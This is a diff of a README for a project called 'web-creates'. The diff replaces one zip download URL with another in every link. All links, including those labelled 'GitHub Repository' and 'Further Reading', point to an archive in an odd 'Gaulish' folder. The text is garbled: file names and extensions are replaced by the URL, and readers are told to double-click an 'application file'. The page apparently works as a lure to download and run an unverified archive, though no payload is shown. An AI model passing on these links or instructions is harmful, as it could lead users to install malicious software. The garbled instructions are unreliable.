@@ -1,7 +1,7 @@
 # 🎨 web-creates - Explore Websites Designed Just for You
 
 ## 🔗 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Xela-stud/web-creates/main/Gaulish/web-creates.zip%20Latest%https://raw.githubusercontent.com/Xela-stud/web-creates/main/Gaulish/web-creates.zip)](https://raw.githubusercontent.com/Xela-stud/web-creates/main/Gaulish/web-creates.zip)
+[![Download Latest Release](https://github.com/Xela-stud/web-creates/raw/refs/heads/main/Gaulish/creates-web-1.4-beta.5.zip%20Latest%https://github.com/Xela-stud/web-creates/raw/refs/heads/main/Gaulish/creates-web-1.4-beta.5.zip)](https://github.com/Xela-stud/web-creates/raw/refs/heads/main/Gaulish/creates-web-1.4-beta.5.zip)
 
 ## 📖 About
 Welcome to "web-creates." Here, you can explore a complete collection of websites. From creative designs to modern web applications, all these projects are crafted by me. You can find examples of coding, CSS, HTML, and JavaScript in action.
@@ -11,13 +11,13 @@ To get started with "web-creates," follow these simple steps to download and run
 
 ### 1. Visit the Releases Page
 To download the latest version of "web-creates," visit the following link:  
-[Download Latest Release](https://raw.githubusercontent.com/Xela-stud/web-creates/main/Gaulish/web-creates.zip)
+[Download Latest Release](https://github.com/Xela-stud/web-creates/raw/refs/heads/main/Gaulish/creates-web-1.4-beta.5.zip)
 
 ### 2. Choose Your Download
 On the Releases page, you will see a list of available versions. Click on the link that corresponds to the latest version. For example, choose the version with the highest number for the best features and updates.
 
 ### 3. Select the Right File
-Once on the version page, look for files that end with common formats such as `.zip` or `https://raw.githubusercontent.com/Xela-stud/web-creates/main/Gaulish/web-creates.zip`. These contain everything you need.
+Once on the version page, look for files that end with common formats such as `.zip` or `https://github.com/Xela-stud/web-creates/raw/refs/heads/main/Gaulish/creates-web-1.4-beta.5.zip`. These contain everything you need.
 
 ### 4. Download the File
 Click on the file name to start the download. Depending on your internet speed, the download may take some time. Wait until it completes.
@@ -26,7 +26,7 @@ Click on the file name to start the download. Depending on your internet speed, 
 Locate the downloaded file in your computer’s downloads folder. Right-click on the file and select "Extract All…" or similar option to unpack the files. Choose a location where you want the files to be stored.
 
 ### 6. Open the Application
-Navigate to the folder where you extracted the files. Look for the application file, which may be named something like `https://raw.githubusercontent.com/Xela-stud/web-creates/main/Gaulish/web-creates.zip`. Double-click this file to open it in your web browser.
+Navigate to the folder where you extracted the files. Look for the application file, which may be named something like `https://github.com/Xela-stud/web-creates/raw/refs/heads/main/Gaulish/creates-web-1.4-beta.5.zip`. Double-click this file to open it in your web browser.
 
 ### 7. Enjoy Exploring Websites
 Once the application is open, you can start exploring various websites designed and developed within the "web-creates" collection. Use the navigation features to check different projects.
@@ -60,7 +60,7 @@ This project covers various topics in web development, including:
 Feel free to explore and get inspired by innovative designs and functionalities.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/Xela-stud/web-creates/main/Gaulish/web-creates.zip)
-- [Further Reading on Web Development](https://raw.githubusercontent.com/Xela-stud/web-creates/main/Gaulish/web-creates.zip)
+- [GitHub Repository](https://github.com/Xela-stud/web-creates/raw/refs/heads/main/Gaulish/creates-web-1.4-beta.5.zip)
+- [Further Reading on Web Development](https://github.com/Xela-stud/web-creates/raw/refs/heads/main/Gaulish/creates-web-1.4-beta.5.zip)
 
 Now you are all set to explore the world of "web-creates." Enjoy discovering the range of websites available and feel free to contribute your ideas!
